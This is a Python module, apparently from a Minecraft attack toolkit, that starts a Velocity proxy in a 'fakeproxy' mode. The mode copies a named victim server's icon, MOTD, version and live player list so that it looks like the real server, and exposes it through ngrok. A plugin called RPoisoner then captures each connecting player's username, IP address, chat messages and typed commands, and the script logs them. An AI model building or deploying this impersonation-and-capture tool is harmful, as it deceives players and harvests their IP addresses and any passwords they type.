import datetime
import os
import shutil
import subprocess
import time

from utils.checks.Encoding import check_encoding
from utils.checks.Ngrok import check_ngrok
from utils.color.MiniMessages import minimessage_colors
from utils.color.TextColor import paint
from utils.gets.IPNgrok import get_ip_ngrok
from utils.gets.Language import language
from utils.gets.LogFile import create_file
from utils.managers.Logs import LogsManager
from utils.managers.Settings import SettingsManager
from utils.minecraft.ServerData import mcstatus
from utils.minecraft.ServerData import mcsrvstatus
from utils.writefile.WriteFile import WriteFile


def start_velocity(server, mode, fakeproxy=False):
    """ 
    Start the velocity.jar

    Parameters:
    server (str): Server IP and port
    """

    sm = SettingsManager()
    settings = sm.read('settings')

    data_file = f'utils/velocity/fakeproxy/plugins/RPoisoner/data.txt'
    data_line = 0
    text_ngrok = ''
    t = ''

    try:
        paint(f'\n    {language["script"]["PREFIX"]}{language["proxy_messages"]["CONFIGURING"]}')
        time.sleep(1)

        with open('utils/otherfiles/velocity_settings', 'r', encoding=check_encoding('utils/otherfiles/velocity_settings')) as f:
            velocity_settings = f.read()

        if fakeproxy:
            velocity_settings = velocity_settings.replace('[[PORT]]', settings['FAKEPROXY_PORT']
                                            ).replace('[[MODE]]', mode.lower()
                                            ).replace('[[ADDRESS]]', server)
            location = 'fakeproxy'
            port = settings['FAKEPROXY_PORT']

        else:
            velocity_settings = velocity_settings.replace('[[PORT]]', settings['VELOCITY_PORT']
                                            ).replace('[[MODE]]', mode.lower()
                                            ).replace('[[ADDRESS]]', server)
            location = 'velocity'
            port = settings['VELOCITY_PORT']

        if fakeproxy:
            file = create_file('fakeproxy')
            logs = LogsManager('fakeproxy', file)
            logs.create(server, mode.capitalize())
            paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["fakeproxy"]["COPYING_DATA"]}')
            time.sleep(0.5)

            data = mcsrvstatus(server)

            if data is None:
                paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["fakeproxy"]["ERROR_WHEN_COPYING"]}')
                return

            if data[5] is not None:
                with open(f'utils/velocity/fakeproxy/server-icon.png', 'wb') as f:
                    f.truncate(0)
                    f.write(data[5])

            else:  
                shutil.copy('utils/otherfiles/server-icon.png', f'utils/velocity/fakeproxy/server-icon.png')

            try:
                WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/commandPrefix', True, 'w+', settings['FAKEPROXY_COMMAND_PREFIX'])

            except FileNotFoundError:
                pass

            if check_ngrok():
                paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["fakeproxy"]["NGROK_START"]}')
                ngrok = subprocess.Popen(f'{settings["NGROK_COMMAND"]} tcp {settings["FAKEPROXY_PORT"]}', stdout=subprocess.PIPE, shell=True)
                time.sleep(0.5)

                ip_ngrok = get_ip_ngrok()

                if ip_ngrok is None:
                    paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["fakeproxy"]["IP_NGROK_ERROR"]}')
                    return
                
            else:
                paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["fakeproxy"]["NGROK_NOT_FOUND"]}')
                ip_ngrok = 'None'
            
        WriteFile(f'utils/velocity/{location}/velocity.toml', True, 'w+', velocity_settings)
        paint(f'\n    {language["script"]["PREFIX"]}{language["proxy_messages"]["STARTING"]}')
        time.sleep(0.5)
        proxy = subprocess.Popen(f'cd utils/velocity/{location} && {settings["VELOCITY_COMMAND"]}', stdout=subprocess.PIPE, shell=True)
        time.sleep(3)

        if fakeproxy:
            if check_ngrok():
                text_ngrok = f'&f&l(&d{ip_ngrok}&f&l)'

            paint(f'\n    {language["proxy_messages"]["PROXY_SERVER_STARTED"].replace("[0]", f"""127.0.0.1:{port}""")} {text_ngrok}')
            paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["fakeproxy"]["WAITING_FOR_DATA"]}\n')

        else:
            paint(f'\n    {language["proxy_messages"]["PROXY_SERVER_STARTED"].replace("[0]", f"""127.0.0.1:{port}""")}\n')

    except KeyboardInterrupt:
        paint(f'\n    {language["script"]["PREFIX"]}{language["proxy_messages"]["STOPPING"]}')
        return
    
    while True:
        try:
            time.sleep(int(settings['FAKEPROXY_UPDATE_DELAY']))

            if fakeproxy:
                if os.path.exists(data_file):
                    with open(data_file, 'r', encoding=check_encoding(data_file)) as f:
                        content = f.readlines()

                    while True:
                        try:
                            line = content[data_line]
                            line = line.replace('\n', '')
                            player_data = line.split('/#-#/')
                            username = player_data[1]
                            ip_address = player_data[2]
                            username_data = f'&c&l{username} &f&l(&c&l{ip_address}&f&l)'
                            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                            if player_data[0] == '[CONNECTING]':
                                logs.write('save_data_from_fakesrv', f'{current_time} {username} ({ip_address}) has entered the server.\n')
                                paint(f'    &f{current_time} {language["commands"]["fakeproxy"]["CONNECTING"].replace("[0]", username_data)}')

                            if player_data[0] == '[DISCONNECTING]':
                                logs.write('save_data_from_fakesrv', f'{current_time} {username} ({ip_address}) has left the server.\n')
                                paint(f'    &f{current_time} {language["commands"]["fakeproxy"]["DISCONNECTING"].replace("[0]", username_data)}')

                            if player_data[0] == '[CHAT]':
                                message = player_data[3]
                                logs.write('save_data_from_fakesrv', f'{current_time} {username} ({ip_address}) has sent a message: {message}\n')
                                paint(f'    &f{current_time} {language["commands"]["fakeproxy"]["MESSAGE_CAPTURED"].replace("[0]", username_data)} &a{message}')

                            if player_data[0] == '[COMMAND]':
                                command = player_data[3]
                                logs.write('save_data_from_fakesrv', f'{current_time} {username} ({ip_address}) has run a command: {command}\n')
                                paint(f'    &f{current_time} {language["commands"]["fakeproxy"]["COMMAND_CAPTURED"].replace("[0]", username_data)} &a{command}')

                            t = '\n'
                            data_line += 1

                        except (IndexError):
                            break

                data = mcstatus(server, replace_colors=False, remove_spaces=False)

                if data is None:
                    continue

                # Updates the proxy data with the data obtained from the victim's server.
                WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/onlinePlayers', True, 'w+', data[3])
                WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/maximumPlayers', True, 'w+', data[4])
                WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/protocol', True, 'w+', data[2])
                WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/version', True, 'w+', minimessage_colors(data[1]))
                WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/motd', True, 'w+', minimessage_colors(data[0]))
                WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/samplePlayers', True, 'w+')

                if data[8] is not None:
                    for player in data[8]:
                        WriteFile(f'utils/velocity/{location}/plugins/RPoisoner/settings/samplePlayers', False, 'a', f'{player.name}/#-#/{player.id}\n')              

        except KeyboardInterrupt:
            if fakeproxy:
                if check_ngrok():
                    ngrok.kill()

            paint(f'{t}    {language["script"]["PREFIX"]}{language["proxy_messages"]["STOPPING"]}')
            proxy.kill()
            return